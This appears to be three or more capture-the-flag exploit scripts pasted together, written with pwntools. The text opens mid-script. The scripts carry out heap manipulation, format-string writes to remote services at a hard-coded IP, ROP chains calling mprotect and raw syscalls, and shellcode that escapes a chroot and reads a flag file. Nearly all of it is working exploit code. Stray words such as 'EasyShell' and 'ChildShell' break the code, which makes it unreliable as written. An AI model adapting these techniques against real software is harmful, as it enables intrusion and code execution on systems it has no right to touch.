for i in range(0x7):
    buy(1, 0x108, '1'*0x108)
    throw(1)
for i in range(0x5):
    buy(0, 0x118, '0'*0x118)
    throw(0)
buy(1, 0x1f8, '4'*0x1f8)
buy(2, 0x1f8, '1'*0x1f8)
buy(4, 0x1f8, '2'*0x1f8)
throw(1)
throw(2)
buy(3, 0x188, '3'*0x188)
buy(3, 0x148, '3'*0x148)
buy(1, 0x1f8, '4'*0x1f8)
buy(1, 0x1f8, '4'*0x1f8)
buy(2, 0x1f8, '1'*0x1f8)
buy(4, 0x1f8, '2'*0x1f8)
throw(1)
throw(2)
buy(3, 0x188, '3'*0x188)
buy(3, 0x148, '3'*0x148)
buy(1, 0x1f8, '4'*0x1f8)
buy(1, 0x1f8, '4'*0x1f8)
buy(2, 0x1f8, '1'*0x1f8)
buy(4, 0x1f8, '2'*0x1f8)
throw(1)
throw(2)
buy(3, 0x188, '3'*0x188)
buy(3, 0x148, '3'*0x148)
buy(1, 0x1f8, '4'*0x1f8)
buy(0, 0x88, '0'*0x88)
buy(1, 0x88, '1'*0x88)
buy(4, 0x200, '4'*0x200)
throw(0)
throw(1)
buy(4, 0x200, '4'*0x200)
change(0, p64(heap+0x3700)+p64(0x100000-0x10))
buy(0,0x118,'0'*0x118)
shellcode = '''
mov rdi, 1
mov rsi, {0}
mov rdx, 0x30
mov rax, 1
syscall
xor rsi, rsi
mov rdi ,{1}
mov rax, 2
syscall
mov rdi, 5
mov rsi, {2} 
mov rdx, 0x30
mov rax, 0
syscall
mov rdi, 1
mov rsi, {3}
mov rdx, 0x30
EasyShell
mov rax, 1
syscall
mov rdi, 0
mov rax, 60
syscall
'''.format(hex(heap+0x1000), 
    hex(heap+0x4200), 
    hex(heap+0x200), 
    hex(heap+0x200),
    hex(heap+0x4200))
rop = p64(heap+0x4050)
rop += p64(heap+0x4050)
rop += p64(0)
rop += p64(0)
rop += p64(setcontext+0x3d)
rop += p64(heap)
rop += p64(l.address+0x0002709c) # pop rsi;ret 
rop += p64(0x21000)
rop += p64(l.address+0x0011c421) # pop rdx; pop r12; ret
rop += p64(0x7)
rop += p64(0)
rop += p64(l.sym['mprotect'])
rop += p64(heap+0x4100)
rop = rop.ljust(0xa0, '\x90')
rop += p64(heap+0x4078)
rop += p64(l.address+0x00026bb2) # pop rdi;ret
rop += asm(shellcode)
rop = rop.ljust(0x1b0,'\x90')
rop += 'flag'
buy(0, 0x200, rop)
# magic 0x00154b90 : mov rdx, [rdi + 8]; mov [rsp], rax; call [rdx + 0x20]
secret(p64(1)+p64(l.address+0x154b90)+p64(heap+0x4050)+p64(4)+p64(5)+p64(6))
backdoor()
p.interactive()
from pwn import *
from fmt_attack import Payload
# 
# p = process('./pwn')
p = remote('183.60.136.226', 11623)
context.log_level = 'debug'
def launch_gdb():
    context.terminal = ['xfce4-terminal', '-x', 'sh', '-c']
    gdb.attach(proc.pidof(p)[0])
# launch_gdb()
'''
0x0000000000422924 : xchg edi, esp ; add al, 0 ; add dh, dh ; ret
0x0000000000401f0a : pop rdi ; ret
0x0000000000471115 : syscall ; return
0x0000000000482286 : pop rax ; pop rdx ; pop rbx ; ret
0x000000000044b3a2 : pop rdi ; jmp rax
0x00000000004014a4 : pop rsi ; ret
0x00000000004203b0 : mov rax, rdi ; ret
0x000000000042ad19 : mov rdi, rax ; call rcx
0x000000000042142b : pop rcx ; ret
'''
a = Payload(10,addon=('%' + str(0x6ED798) + 'x').ljust(0x10,'a'))
a.add_write_chunk(0x0000000000422924,0x6ED7A8,write_len=4)
a.add_write_chunk(0x0000000000401f0a,0x6ED7b8,write_len=4)
a.add_write_chunk(0x6E,0x6ED7b8 + 8 + 2,write_len=1)
a.add_write_chunk(0xb8 + 0x10,0x6ED7b8 + 8,write_len=1)
a.add_write_chunk(0xd7,0x6ED7b8 + 9,write_len=1)
a.add_write_chunk(0x0000000000400BCE,0x6ED7b8 + 0x10,write_len=4)
payload  = a.get_payload()
# print(payload.encode('hex'))
p.recvuntil('Input your message')
p.sendline(payload.ljust(0xc0))
p.recvuntil('Take your message:')
# p.recvuntil('aaa') 
rop2 = 'flag'.ljust(8,'\\x00')
rop2 += p64(0x0000000000482286) + p64(0x0000000000482286) + p64(0) * 2
rop2 += p64(0x000000000044b3a2) + p64(0)
rop2 += p64(0) + p64(0x200) +  p64(0)
rop2 += p64(0x00000000004014a4) + p64(0x6ED7b8 + 0x18)
rop2 += p64(0x0000000000471115)
p.clean()
p.sendline(rop2.ljust(0xc0))
rop3 = p64(0x00000000004014a5) * 20
rop3 += p64(0x0000000000482286) + p64(0x0000000000482286) + p64(0) * 2
rop3 += p64(0x000000000044b3a2) + p64(0x6ED7b8 + 0x10)
rop3 += p64(2) + p64(0) * 2
rop3 += p64(0x00000000004014a4) + p64(0)
rop3 += p64(0x0000000000471115)
ChildShell
rop3 += p64(0x000000000042142b) + p64(0x00000000004014a4)
rop3 += p64(0x000000000042ad19)
rop3 += p64(0x0000000000482286) + p64(0) + p64(0x100) + p64(0)
rop3 += p64(0x00000000004014a4) + p64(0x6ED7b8 + 0x18)
rop3 += p64(0x0000000000471115)
# rop3 += p64(0x0000000000482286) + p64(0x0000000000482286) + p64(0) * 2
# rop3 += p64(0x000000000044b3a2) + p64(3)
# rop3 += p64(0) + p64(0x20) + p64(0)
# rop3 += p64(0x00000000004014a4) + p64(0x6ED7b8 + 0x18)
# rop3 += p64(0x0000000000471115)
rop3 += p64(0x0000000000482286) + p64(0x0000000000482286) + p64(0) * 2
rop3 += p64(0x000000000044b3a2) + p64(1)
rop3 += p64(1) + p64(0x40) + p64(0)
rop3 += p64(0x00000000004014a4) + p64(0x6ED7b8 + 0x18)
rop3 += p64(0x0000000000471115)
rop3 += p64(0x0000000000482286) + p64(0x0000000000482286) + p64(0) * 2
rop3 += p64(0x000000000044b3a2) + p64(1)
rop3 += p64(1) + p64(0x20) + p64(0)
rop3 += p64(0x00000000004014a4) + p64(0x6ED7b8 + 0x18)
rop3 += p64(0x0000000000471115)
sleep(1)
p.send(rop3.ljust(0x3000))
p.interactive()
from pwn import *
from fmt_attack import Payload
# https://github.com/pzhxbz/my_ctf_tools/blob/master/fmt_attack/fmt_attack.py
# p = process('./pwn')
p = remote('183.60.136.226', 17564)
context.log_level = 'debug'
context.arch = 'amd64'
def launch_gdb():
    context.terminal = ['xfce4-terminal', '-x', 'sh', '-c']
    gdb.attach(proc.pidof(p)[0])
'''
0x00000000004199a4 : xchg edi, esp ; add al, 0 ; add dh, dh ; ret
0x0000000000401a36 : pop rdi ; ret
0x0000000000468bf5 : syscall ; ret
0x0000000000479976 : pop rax ; pop rdx ; pop rbx ; ret
0x0000000000401b57 : pop rsi ; ret
'''
a = Payload(10,addon=('%' + str(0x6CB778) + 'x').ljust(0x10,'a'))
a.add_write_chunk(0x00000000004199a4,0x6CB788,write_len=4)
a.add_write_chunk(0x0000000000401a36,0x6CB798,write_len=4)
a.add_write_chunk(0x6CB798 + 0x10,0x6CB798 + 8,write_len=4)
a.add_write_chunk(0x00000000004009AE,0x6CB798 + 0x10,write_len=4)
payload  = a.get_payload()
p.recvuntil('Input your message')
p.sendline(payload.ljust(0xc0))
p.recvuntil('Take your message:')
rop2 = 'flag'.ljust(8,'\x00')
rop2 += p64(0x0000000000401a36) + p64(0)
rop2 += p64(0x0000000000479976) + p64(0) + p64(0x1000) + p64(0)
rop2 += p64(0x0000000000401b57) + p64(0x6CB798 + 0x18)
rop2 += p64(0x0000000000468bf5)
p.clean()
p.sendline(rop2.ljust(0xc0))
'''
0x00000000004a4deb : jmp rsp
'''
rop3 = p64(0x0000000000401b58) * 20
rop3 += p64(0x0000000000401a36) + p64(0x6ca000)
rop3 += p64(0x0000000000479976) + p64(10) + p64(7) + p64(0)
rop3 += p64(0x0000000000401b57) + p64(0x3000)
rop3 += p64(0x0000000000468bf5)
rop3 += p64(0x00000000004a4deb)
shellcode = '''
push 3290158;
mov rdi,rsp;
mov rsi,493;
mov rax,83;
syscall;
mov rdi,rsp;
mov rax,161;
syscall;
mov r15,13280099800329775;
push r15;
mov r15,3327649050063220270;
push r15;
mov rdi,rsp;
mov rax,161;
syscall;
''' + shellcraft.cat('/home/pwn/flag')
rop3 += asm(shellcode)
p.send(rop3)
p.interactive()